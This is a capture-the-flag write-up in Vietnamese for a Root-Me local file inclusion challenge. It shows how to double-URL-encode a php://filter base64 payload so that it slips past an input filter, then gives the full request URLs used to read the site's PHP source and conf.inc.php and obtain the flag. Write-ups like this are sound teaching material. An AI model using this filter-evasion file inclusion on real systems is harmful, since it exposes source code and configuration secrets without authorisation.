# Local File Inclusion - Double encoding

- 30 Points  

- Include can be dangerous

- No hints

# Overview:

![image](https://user-images.githubusercontent.com/115911041/229867328-8eca7f32-7935-45ff-a99e-2c6131de8847.png)

Theo đề bài nói ta cần phải double encode filepath để tránh bị phát hiện.

# Solution:

| Char | simple encoding | double encoding |
| :---:|      :---:      |      :---:      |
| :    | :3A             | : %253A         |
| /	   | : 2F	           | : %252F         |
| .	   | : 2E	           | : %252E         |
| -	   | : 2D	           | : %252D         |
| =	   | : 3D	           | : %253D         |
| <    | : 3C            | : %253C         |
| >    | : 3E            | : %253E         |

Chúng ta sử dụng payload `php://filter` với [base64 encoding](https://www.base64decode.org/). Các payload tham khảo [tại đây](https://github.com/payloadbox/rfi-lfi-payload-list)

`php://filter/convert.base64-encode/resource=cv`

Sau đó double encoding

`php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dcv`

Ta có thể encode cả URL

`http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dcv`

Ta được kết quả là 1 chuỗi kí tự dài.Copy chuỗi đó vào Base64 encoded ta được

`<?php include("conf.inc.php"); ?>`

Nhận thấy có lệnh `include()` vậy chắc chắc flag nằm trong `conf.inc.php` 

`http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64%252Dencode%252Fresource%253Dconf`

Kết quả ta nhận được là 1 chuỗi dài như lúc trước. Tiếp tục base64 encoded, ta có được flag

![image](https://user-images.githubusercontent.com/115911041/229880520-032057ad-7f3d-496e-917e-e07cdfc600d9.png)
